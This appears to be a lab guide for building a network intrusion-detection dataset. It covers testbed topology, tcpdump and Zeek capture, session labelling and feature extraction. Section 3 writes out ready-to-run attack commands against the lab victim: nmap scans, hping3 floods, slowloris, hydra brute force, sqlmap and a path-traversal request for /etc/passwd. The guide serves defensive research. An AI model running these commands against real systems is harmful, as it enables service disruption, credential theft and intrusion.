# Network Intrusion Detection Lab Capture Guide

This guide details the procedure for generating, recording, and labelling real network traffic in an isolated testbed for intrusion detection evaluation. It covers virtual machine architecture, network tap configuration, packet capture (tcpdump) and session logging (Zeek), attack generation tools, session-window ground truth logging (`session_labels.csv`), and feature extraction using `src/data/feature_extractor.py`.

---

## 1. Testbed Architecture & Network Topology

The experimental capture testbed requires an isolated virtual or physical network with strictly controlled timing and no unmetered external traffic.

```
+------------------------------------------------------------------------+
|                      Isolated Testbed Subnet (10.0.0.0/24)             |
|                                                                        |
|  +---------------------+                       +--------------------+  |
|  |     Attacker VM     |                       |     Victim VM      |  |
|  |     Kali Linux      |                       |  Ubuntu 22.04 LTS  |  |
|  |     10.0.0.5        |                       |     10.0.0.10      |  |
|  +----------+----------+                       +---------+----------+  |
|             |                                            |             |
|             +---------------------+----------------------+             |
|                                   |                                    |
|                       +-----------v------------+                       |
|                       |  Capture / Sensor Host |                       |
|                       |   tcpdump + Zeek Tap   |                       |
|                       |   Promiscuous Mode     |                       |
|                       +------------------------+                       |
+------------------------------------------------------------------------+
```

### 1.1 Host Configurations
- **Victim Server (10.0.0.10):**
  - OS: Ubuntu 22.04 LTS Server.
  - Services: Nginx/Apache (HTTP 80, HTTPS 443), OpenSSH (22), vsftpd (21), vulnerable web applications (e.g. DVWA or custom Flask endpoints).
  - Synchronize clocks via NTP: `timedatectl set-ntp on` to ensure microsecond alignment with capture timestamps.
- **Attacker Node (10.0.0.5):**
  - OS: Kali Linux 2024.x.
  - Tools installed: `nmap`, `hping3`, `hydra`, `sqlmap`, `slowloris`, `curl`, `ab` (ApacheBench).
- **Sensor / Monitor Node:**
  - Placed on a mirrored port (SPAN) or host-only virtual switch interface in promiscuous mode (`ip link set eth0 promisc on`).

---

## 2. Capture Instrumentation (tcpdump & Zeek)

Captures must record full packets without truncation (`snaplen 0`) and microsecond timestamp resolution.

### 2.1 tcpdump Procedure
Run `tcpdump` on the capture interface before starting each attack or benign traffic session:

```bash
# Set interface to promiscuous mode
sudo ip link set eth0 promisc on

# Capture raw packets to pcap with microsecond timestamps and unbuffered writes
sudo tcpdump -i eth0 -s 0 -U -w /captures/20260901_sess_002_DoS.pcap \
  "net 10.0.0.0/24 and not ether proto 0x888e"
```

### 2.2 Zeek Sensor Procedure
If Zeek connection logging is used alongside raw pcap:

```bash
# Run Zeek with JSON-lines logging enabled
zeek -i eth0 LogAscii::use_json=T \
  -e 'redef LogAscii::json_timestamps = JSON::TS_ISO8601;'
```
The resulting `conn.log` records connection 5-tuples, packet counts, byte counts, and connection state history.

---

## 3. Attack Generation Procedures

Each attack session is executed in a dedicated time window. The start and end timestamps (UTC) must be recorded down to the exact second.

### 3.1 PortScan (`nmap`)
- **SYN Stealth Scan across full port range:**
  ```bash
  nmap -sS -p 1-65535 -T4 -n 10.0.0.10
  ```
- **Service & OS Detection Scan:**
  ```bash
  nmap -sV -O -p 21,22,80,443,3306 -T4 10.0.0.10
  ```

### 3.2 Denial of Service (`hping3` & `slowloris`)
- **SYN Flood DoS:**
  ```bash
  sudo hping3 -S -p 80 --flood 10.0.0.10
  ```
- **UDP Flood DoS:**
  ```bash
  sudo hping3 --udp -p 53 --flood 10.0.0.10
  ```
- **Slowloris (Slow HTTP Connection Exhaustion):**
  ```bash
  slowloris 10.0.0.10 -p 80 -s 250 --sleeptime 15
  ```

### 3.3 Brute Force (`hydra`)
- **SSH Credential Stuffing:**
  ```bash
  hydra -l root -P /usr/share/wordlists/rockyou.txt -t 4 ssh://10.0.0.10
  ```
- **FTP Credential Brute Force:**
  ```bash
  hydra -l admin -P /usr/share/wordlists/passwords.txt -t 4 ftp://10.0.0.10
  ```

### 3.4 Web Attacks (`sqlmap` & `curl`)
- **Automated SQL Injection Probing:**
  ```bash
  sqlmap -u "http://10.0.0.10/login.php?user=test" --batch --crawl=2
  ```
- **Directory Traversal / Command Injection:**
  ```bash
  curl -s "http://10.0.0.10/vulnerable.php?file=../../../../etc/passwd"
  ```

### 3.5 Benign Background Traffic Generation
To ensure realistic flows, background benign traffic must run continuously:
- **Web Browsing & File Transfers:**
  ```bash
  ab -n 5000 -c 10 http://10.0.0.10/index.html
  wget -r -np -nd -q http://10.0.0.10/documents/
  ```
- **SSH Administrative Sessions:**
  Automated SSH session with realistic terminal commands (file editing, directory listings, process checks).

---

## 4. Session Labels Specification (`session_labels.csv`)

Ground-truth flow labelling is performed using capture-session time windows. All sessions must be logged in `lab/capture_logs/session_labels.csv`.

### 4.1 Schema Definition
| Column | Type | Description |
|---|---|---|
| `session_id` | string | Unique identifier (e.g. `sess_001`). |
| `timestamp_start` | ISO 8601 string | UTC start time (e.g. `2026-09-01T10:15:00Z`). |
| `timestamp_end` | ISO 8601 string | UTC end time (e.g. `2026-09-01T10:20:00Z`). |
| `source_ip` | string | Initiating IP (Attacker or Benign client). |
| `target_ip` | string | Target IP (Victim server). |
| `attack_type` | string | Taxonomy label (`Benign`, `DoS`, `PortScan`, `BruteForce`, `WebAttack`, `Botnet`). |
| `tools_used` | string | Tools employed (e.g. `hping3`, `nmap`, `hydra`). |
| `notes` | string | Technical notes on flags or payloads. |

### 4.2 Example `session_labels.csv` Content
```csv
session_id,timestamp_start,timestamp_end,source_ip,target_ip,attack_type,tools_used,notes
sess_001,2026-09-01T10:00:00Z,2026-09-01T10:15:00Z,10.0.0.5,10.0.0.10,Benign,curl/wget,Normal HTTP SSH and FTP background traffic
sess_002,2026-09-01T10:15:00Z,2026-09-01T10:20:00Z,10.0.0.5,10.0.0.10,DoS,hping3,SYN flood against port 80
sess_003,2026-09-01T10:20:00Z,2026-09-01T10:30:00Z,10.0.0.5,10.0.0.10,PortScan,nmap,SYN stealth scan across 65535 ports
sess_004,2026-09-01T10:30:00Z,2026-09-01T10:40:00Z,10.0.0.5,10.0.0.10,BruteForce,hydra,SSH login brute force with rockyou list
sess_005,2026-09-01T10:40:00Z,2026-09-01T10:50:00Z,10.0.0.5,10.0.0.10,WebAttack,sqlmap,Automated SQL injection probing
sess_006,2026-09-01T10:50:00Z,2026-09-01T11:00:00Z,10.0.0.5,10.0.0.15,Botnet,metasploit,C2 reverse TCP beaconing session
```

---

## 5. End-to-End Feature Extraction

Once pcaps or Zeek logs are placed in `data/lab_captures/`, feature extraction is executed end-to-end via `src/data/feature_extractor.py`.

### 5.1 Python API Usage

```python
from pathlib import Path
from src.data.feature_extractor import extract_lab_features

# 1. Extract from an entire capture directory:
df_all = extract_lab_features(
    lab_dir=Path("data/lab_captures"),
    session_labels=Path("lab/capture_logs/session_labels.csv"),
    drop_identity=True,
    save_to=Path("data/lab_captures/lab_flows.csv"),
)
print(f"Extracted {len(df_all)} flows across labels: {df_all['label'].value_counts().to_dict()}")

# 2. Extract from a single PCAP file:
df_single = extract_lab_features(
    lab_dir=Path("data/lab_captures/20260901_sess_002_DoS.pcap"),
    save_to=Path("results/dos_extracted.csv"),
)
print(f"Extracted {len(df_single)} flows from single PCAP.")
```

### 5.2 Command Line Interface
Extract features directly using `scripts/generate_lab_capture.py`:

```bash
# Process existing PCAP/Zeek captures without regenerating synthetic packets
python scripts/generate_lab_capture.py --extract-only --output-dir data/lab_captures
```

### 5.3 Canonical Schema Output
The extractor projects all flows into the canonical 28-feature representation:
- Timing: `flow_duration`, `flow_iat_mean`, `flow_iat_std`, `fwd_iat_mean`, `bwd_iat_mean`
- Volumes: `total_fwd_packets`, `total_bwd_packets`, `total_length_of_fwd_packets`, `total_length_of_bwd_packets`, `total_length_of_packets`
- Packet statistics: `fwd_packet_length_mean`, `fwd_packet_length_std`, `fwd_packet_length_max`, `fwd_packet_length_min`, `bwd_packet_length_mean`, `bwd_packet_length_std`, `bwd_packet_length_max`, `bwd_packet_length_min`, `packet_length_mean`, `packet_length_std`
- Flags: `syn_flag_count`, `ack_flag_count`, `rst_flag_count`, `fin_flag_count`, `psh_flag_count`
- Rates & ratios: `flow_bytes_per_sec`, `flow_packets_per_sec`, `down_up_ratio`
- Ground-truth label: `label` (mapped via `session_labels.csv`)

